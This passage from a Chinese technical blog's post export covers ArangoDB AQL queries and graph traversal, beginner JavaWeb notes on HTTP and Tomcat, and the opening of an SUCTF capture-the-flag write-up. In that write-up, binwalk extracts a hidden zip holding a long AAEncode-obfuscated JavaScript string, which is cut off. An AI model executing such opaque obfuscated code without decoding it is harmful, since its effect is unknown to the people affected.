<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/7.png" alt="1"></p>
<p>如下是在 <code>user</code> 集合中的文档数据，每个文档相当于一条 json 形式的数据记录，除了默认三个属性，其它都可不必相同。</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/8.png" alt="1"></p>
<h2 id="3-ArangoDB-基本操作"><a href="#3-ArangoDB-基本操作" class="headerlink" title="3. ArangoDB 基本操作"></a>3. ArangoDB 基本操作</h2><p>ArangoDB 使用 <code>AQL</code> 查询语言，类似 <code>SQL</code> 语言，对文档数据的基本操作示例如下：</p>
<ul>
<li>查询某个 Document：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT(&quot;users/9883&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询多个 Document：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RETURN DOCUMENT( [&quot;users/9883&quot;, &quot;users/9915&quot;, &quot;users/10074&quot;] )</span><br></pre></td></tr></table></figure>

<ul>
<li>查询 Collection 中所有数据：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  RETURN user</span><br></pre></td></tr></table></figure>

<ul>
<li>查询结果排序：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  SORT user._key</span><br><span class="line">  RETURN user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  SORT user.age DESC</span><br><span class="line">  RETURN user</span><br></pre></td></tr></table></figure>

<ul>
<li>查询结果筛选：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  FILTER user.age &gt; 30</span><br><span class="line">  SORT user.age</span><br><span class="line">  RETURN user</span><br></pre></td></tr></table></figure>

<ul>
<li>查询并返回指定属性：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  FILTER user.age &gt; 30</span><br><span class="line">  SORT user.age</span><br><span class="line">  RETURN user.name</span><br></pre></td></tr></table></figure>

<p>返回示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &quot;John Smith&quot;,</span><br><span class="line">  &quot;Katie Foster&quot;,</span><br><span class="line">  &quot;James Hendrix&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>查询、指定属性、重命名并返回 json 对象：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">  RETURN &#123; userName: user.name, age: user.age &#125;</span><br></pre></td></tr></table></figure>

<p>返回示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;userName&quot;: &quot;James Hendrix&quot;,</span><br><span class="line">    &quot;age&quot;: 69</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;userName&quot;: &quot;John Smith&quot;,</span><br><span class="line">    &quot;age&quot;: 32</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;userName&quot;: &quot;Katie Foster&quot;,</span><br><span class="line">    &quot;age&quot;: 40</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>多 Collection 联合查询并返回 json 列表：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 != user2</span><br><span class="line">    RETURN [user1.name, user2.name]</span><br></pre></td></tr></table></figure>

<p>返回示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [ &quot;James Hendrix&quot;, &quot;John Smith&quot; ],</span><br><span class="line">  [ &quot;James Hendrix&quot;, &quot;Katie Foster&quot; ],</span><br><span class="line">  [ &quot;John Smith&quot;, &quot;James Hendrix&quot; ],</span><br><span class="line">  [ &quot;John Smith&quot;, &quot;Katie Foster&quot; ],</span><br><span class="line">  [ &quot;Katie Foster&quot;, &quot;James Hendrix&quot; ],</span><br><span class="line">  [ &quot;Katie Foster&quot;, &quot;John Smith&quot; ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>复杂查询：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user1 IN users</span><br><span class="line">  FOR user2 IN users</span><br><span class="line">    FILTER user1 != user2</span><br><span class="line">    LET sumOfAges = user1.age + user2.age</span><br><span class="line">    FILTER sumOfAges &lt; 100</span><br><span class="line">    RETURN &#123;</span><br><span class="line">        pair: [user1.name, user2.name],</span><br><span class="line">        sumOfAges: sumOfAges</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>更新 Document 中的某些属性（不存在则创建），不影响其它属性：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE &quot;9915&quot; WITH &#123; age: 40 &#125; IN users</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>

<ul>
<li>更新 Document 中的某些属性，并删除其它属性（<code>_key</code>、<code>_id</code> 等除外）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REPLACE &quot;9915&quot; WITH &#123; age: 40 &#125; IN users</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>

<ul>
<li>插入文档：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT &#123; name: &quot;Katie Foster&quot;, age: 27 &#125; INTO users</span><br></pre></td></tr></table></figure>

<ul>
<li>插入文档并返回插入数据：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT &#123; name: &quot;James Hendrix&quot;, age: 69 &#125; INTO users</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>

<ul>
<li>删除指定 Document：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REMOVE &quot;9883&quot; IN users</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR user IN users</span><br><span class="line">    FILTER user.age &gt;= 30</span><br><span class="line">    REMOVE user IN users</span><br></pre></td></tr></table></figure>

<h2 id="4-ArangoDB-图概念"><a href="#4-ArangoDB-图概念" class="headerlink" title="4. ArangoDB 图概念"></a>4. ArangoDB 图概念</h2><p>在 ArangoDB 的图模式中，结点（实体）用 <code>Document</code> 存储，边（关系）用 <code>Edge</code> 存储。</p>
<p>Edge 是一种特殊的 Document，也存储在 Collection 集合中，几乎相当于 Document。区别是，Edge 除了默认的 <code>_id</code>、<code>_key</code> 属性，还有默认的 <code>_from</code>、<code>_to</code> 属性，分别指向边所连结点的 <code>_id</code>。</p>
<p>对 Edge 的增删改查操作与对 Document 操作几乎相同，区别是 <code>_from</code>、<code>_to</code> 属性不能为空。比如，插入边时必须要指定 <code>_from</code>、<code>_to</code> 属性值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT &#123;_from: &quot;papers/38153&quot;, _to: &quot;authors/37290&quot; &#125; INTO write_by</span><br><span class="line">RETURN NEW</span><br></pre></td></tr></table></figure>

<p>对比关系数据库：</p>
<ul>
<li><p>在关系数据库中，实体间关系通过外键以及中间表的形式表示，关系查询则通过表连接的形式表示；</p>
</li>
<li><p>而在 ArangoDB 图模式中，关系数据与实体数据相互区分，实体间关系更加清晰，并提供逻辑清晰的、专门的、性能更强的关系查询</p>
</li>
</ul>
<p>在 ArangoDB 可视化操作界面中，创建的点集合和边集合如下：</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/4.png" alt="1"></p>
<p>可视化界面中还提供 Graph 图的显示，设置好边的起止点集合等信息，就可以显示出对应的图：</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/6.png" alt="1"></p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/5.png" alt="1"></p>
<h2 id="5-ArangoDB-图操作"><a href="#5-ArangoDB-图操作" class="headerlink" title="5. ArangoDB 图操作"></a>5. ArangoDB 图操作</h2><p>参考：<a href="https://www.arangodb.com/learn/graphs/graph-course/">Graph Course</a></p>
<p>在 ArangoDB 的图操作中，对结点和边的增删改查，就是对 Document 数据的基本操作，不再赘述。</p>
<p>图操作的关键是<strong>关系查询操作</strong>，也称<strong>图遍历（Graph Traversal）</strong>，相当于关系数据库中的连接查询。</p>
<p>ArangoDB 中，进行图遍历（关系操作）的 <code>AQL</code> 语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR vertex[, edge[, path]]</span><br><span class="line">  IN [min[..max]]</span><br><span class="line">  OUTBOUND|INBOUND|ANY startVertex edgeCollection[, more…]</span><br></pre></td></tr></table></figure>

<p><code>FOR</code> 后跟着三个变量：</p>
<ul>
<li><code>vertex</code> 必选，指代此次遍历中的点</li>
<li><code>edge</code> 可选，指代此次遍历中的边</li>
<li><code>path</code> 可选，此次遍历的路径，包含两个属性：<ul>
<li><code>vertices</code> 路径上所有点的数组</li>
<li><code>edges</code> 路径上所有边的数组</li>
</ul>
</li>
</ul>
<p><code>IN [min[..max]]</code> 指明遍历深度，<code>min</code> 默认为 1 ，<code>max</code> 默认等于 <code>min</code>。</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/10.png" alt="1"></p>
<p><code>OUTBOUND|INBOUND|ANY startVertex edgeCollection[, more…]</code> 中：</p>
<ul>
<li><code>startVertex</code> 指明遍历开始点</li>
<li><code>OUTBOUND|INBOUND|ANY</code> 指明遍历方向</li>
<li><code>edgeCollection[, more…]</code> 指明遍历可经过的边集合</li>
</ul>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/11.png" alt="1"></p>
<p>使用示例（现有 airports 点集合和 flights 边集合）：</p>
<ul>
<li>查询所有从 <code>LAX</code> 机场出发，深度为1，经过 <code>flights</code> 边到达的机场的名字：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR airport IN 1..1 OUTBOUND &#x27;airports/LAX&#x27; flights</span><br><span class="line">  RETURN DISTINCT airport.name</span><br></pre></td></tr></table></figure>

<ul>
<li>查询10个从 <code>LAX</code> 机场出发，深度为1，经过 <code>flights</code> 边最终到达的机场和经过的边：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN OUTBOUND &#x27;airports/LAX&#x27; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN &#123;airport, flight&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>查询10个到达 <code>BIS</code> 机场，深度为1，<code>flights</code> 集合的边：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN INBOUND &#x27;airports/BIS&#x27; flights</span><br><span class="line">  LIMIT 10</span><br><span class="line">  RETURN flight</span><br></pre></td></tr></table></figure>

<p>返回的可视化结果如下：</p>
<p><img src="/ArangoDB%E5%85%A5%E9%97%A8/9.png" alt="1"></p>
<ul>
<li>查询所有1月5至1月7号间，从 <code>BIS</code> 机场出发或到达 <code>BIS</code> 机场，深度为1的机场城市及航班时间：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FOR airport, flight IN ANY &#x27;airports/BIS&#x27; flights</span><br><span class="line">  FILTER flight.Month == 1</span><br><span class="line">    AND flight.Day &gt;= 5</span><br><span class="line">    AND flight.Day &lt;= 7</span><br><span class="line">  RETURN &#123; city: airport.city, time: flight.ArrTimeUTC &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>ArangoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb学习之入门</title>
    <url>/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h3 id="前言（后加）"><a href="#前言（后加）" class="headerlink" title="前言（后加）"></a>前言（后加）</h3><p>本文是笔者最初入门web时，所写的笔记。时隔多日，打算将此放上博客。虽然，现在看来，其中内容十分简单，但也算笔者曾经的天真。</p>
<p>注：本文内容大多是阅读<a href="http://www.cnblogs.com/xdp-gacl/tag/JavaWeb%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/default.html?page=3">一位大神博客</a>所总结的。</p>
<span id="more"></span>

<h3 id="一、JavaWeb初识"><a href="#一、JavaWeb初识" class="headerlink" title="一、JavaWeb初识"></a>一、JavaWeb初识</h3><p>1.JavaWeb，指用java为编程语言的Web后端。<br>2.服务器，一台高性能的电脑主机。<br>3.静态与动态Web：</p>
<ul>
<li>静态Web。如HTML网页，无法与用户交互，网页数据始终一样</li>
<li>动态Web。Web的页面展示效果因时因人而变。如 JSP、PHP、ASP即可实现动态web。</li>
</ul>
<h3 id="二、客户端与服务器的交互机制"><a href="#二、客户端与服务器的交互机制" class="headerlink" title="二、客户端与服务器的交互机制"></a>二、客户端与服务器的交互机制</h3><p>如下图：<img src="/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8/http1.png" alt="http1"></p>
<h3 id="三、互联网的加密原理"><a href="#三、互联网的加密原理" class="headerlink" title="三、互联网的加密原理"></a>三、互联网的加密原理</h3><p>分为对称加密和非对称加密。</p>
<h3 id="四、Http协议"><a href="#四、Http协议" class="headerlink" title="四、Http协议"></a>四、Http协议</h3><h4 id="1-Http请求消息"><a href="#1-Http请求消息" class="headerlink" title="1.Http请求消息"></a>1.Http请求消息</h4><p>1.1客户端连上服务器后，向服务器请求某个web资源，称之为客户端向服务器发送了一个HTTP请求。一个完整的HTTP请求包括如下内容：一个请求行、若干消息头、以及实体内容</p>
<p>1.2请求行中的GET称之为请求方式，请求方式有：POST、GET、HEAD、OPTIONS、DELETE、TRACE、PUT，常用的有： GET、 POST。GET方式的特点：在URL地址后附带的参数是有限制的，其数据容量通常不能超过1K。如果请求方式为POST方式，则可以在请求的实体内容中向服务器发送数据，Post方式的特点：传送的数据量无限制</p>
<p>1.3HTTP请求中的常用消息头:</p>
<ul>
<li>accept:浏览器通过这个头告诉服务器，它所支持的数据</li>
<li>Accept-Charset: 浏览器通过这个头告诉服务器，它支持哪种字符集</li>
<li>Accept-Encoding：浏览器通过这个头告诉服务器，支持的压缩格式</li>
<li>Accept-Language：浏览器通过这个头告诉服务器，它的语言环境</li>
<li>Host：浏览器通过这个头告诉服务器，想访问哪台主机</li>
<li>If-Modified-Since: 浏览器通过这个头告诉服务器，缓存数据的时间</li>
<li>Referer：浏览器通过这个头告诉服务器，客户机是哪个页面来的  防盗链</li>
<li>Connection：浏览器通过这个头告诉服务器，请求完后是断开链接还是何持链接</li>
</ul>
<h4 id="2Http响应消息"><a href="#2Http响应消息" class="headerlink" title="2Http响应消息"></a>2Http响应消息</h4><p>2.1一个HTTP响应代表服务器向客户端回送的数据，它包括： 一个状态行、若干消息头、以及实体内容 。</p>
<p>2.2状态行格式： HTTP版本号　状态码　原因叙述<CRLF><br>举例：HTTP&#x2F;1.1 200 OK</p>
<p>2.3HTTP响应中的常用响应头(消息头):</p>
<ul>
<li>Location: 服务器通过这个头，来告诉浏览器跳到哪里</li>
<li>Server：服务器通过这个头，告诉浏览器服务器的型号</li>
<li>Content-Encoding：服务器通过这个头，告诉浏览器，数据的压缩格式</li>
<li>Content-Length: 服务器通过这个头，告诉浏览器回送数据的长度</li>
<li>Content-Language: 服务器通过这个头，告诉浏览器语言环境</li>
<li>Content-Type：服务器通过这个头，告诉浏览器回送数据的类型</li>
<li>Refresh：服务器通过这个头，告诉浏览器定时刷新</li>
<li>Content-Disposition: 服务器通过这个头，告诉浏览器以下载方式打数据</li>
<li>Transfer-Encoding：服务器通过这个头，告诉浏览器数据是以分块方式回送的</li>
<li>Expires: -1  控制浏览器不要缓存</li>
</ul>
<h3 id="五、Tomcat容器"><a href="#五、Tomcat容器" class="headerlink" title="五、Tomcat容器"></a>五、Tomcat容器</h3><h4 id="1-Tomcat目录结构"><a href="#1-Tomcat目录结构" class="headerlink" title="1.Tomcat目录结构"></a>1.Tomcat目录结构</h4><p>如下图：<img src="/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8/Tomcat1.png" alt="Tomcat1"></p>
<h4 id="2-配置端口"><a href="#2-配置端口" class="headerlink" title="2.配置端口"></a>2.配置端口</h4><p>2.1默认端口为8080</p>
<p>2.2如果想修改Tomcat服务器的启动端口，则可以在server.xml配置文件中的Connector节点进行的端口修改</p>
<h4 id="3-设置虚拟目录映射"><a href="#3-设置虚拟目录映射" class="headerlink" title="3.设置虚拟目录映射"></a>3.设置虚拟目录映射</h4><p>3.1在server.xml文件的host元素中配置</p>
<p>3.2！！！每次修改server.xml都要重启Tomcat</p>
<p>3.3加入<code>&lt;Context path=&quot;/My&quot; docBase=&quot;F:\JavaWebDemoProject&quot; /&gt;</code>即可将在F盘下的JavaWebDemoProject这个JavaWeb应用映射到My这个虚拟目录上，My这个虚拟目录是由Tomcat服务器管理的，My是一个硬盘上不存在的目录，是我们自己随便写的一个目录，也就是虚拟的一个目录，所以称之为”虚拟目录”</p>
<h4 id="4-Tomcat体系结构"><a href="#4-Tomcat体系结构" class="headerlink" title="4.Tomcat体系结构"></a>4.Tomcat体系结构</h4><p>如下图：<img src="/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8/Tomcat2.png" alt="Tomcat2"></p>
<h3 id="六、Servlet"><a href="#六、Servlet" class="headerlink" title="六、Servlet"></a>六、Servlet</h3><p>一种用于开发动态web的技术：<img src="/JavaWeb%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%85%A5%E9%97%A8/JavaWeb1.png" alt="JavaWeb1"></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF线上赛writeup ---- by douNine</title>
    <url>/SUCTF-writeup-douNine.html</url>
    <content><![CDATA[<h3 id="一、misc"><a href="#一、misc" class="headerlink" title="一、misc"></a>一、misc</h3><h4 id="1-single-dog"><a href="#1-single-dog" class="headerlink" title="1.single dog:"></a>1.single dog:</h4><span id="more"></span>

<p>下载后，启用虚拟机的共享文件夹，然后在虚拟机Ubuntu下，用binwalk查看该文件夹中lalalala.jpg：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dou9@ubuntu:/mnt/hgfs/SUCTF/misc/single-dog$ binwalk lalalala.jpg</span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">18142         0x46DE          Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&quot;&gt;&lt;rdf:Description rdf:about=&quot;uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b&quot; xmlns:xmp=&quot;http://</span><br><span class="line">115772        0x1C43C         Zip archive data, at least v2.0 to extract, compressed size: 729, uncompressed size: 8206, name: 1.txt</span><br><span class="line">116623        0x1C78F         End of Zip archive</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现该jpg文件中藏着一个压缩包，压缩包中有一个txt文件。接下来，直接用<code>binwalk -e lalalala.jpg</code>拆分该文件。最终，生成一个了压缩包，在该压缩包中有一个1.txt文件，查看该文件后发现里面是一堆有规律的字符：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) 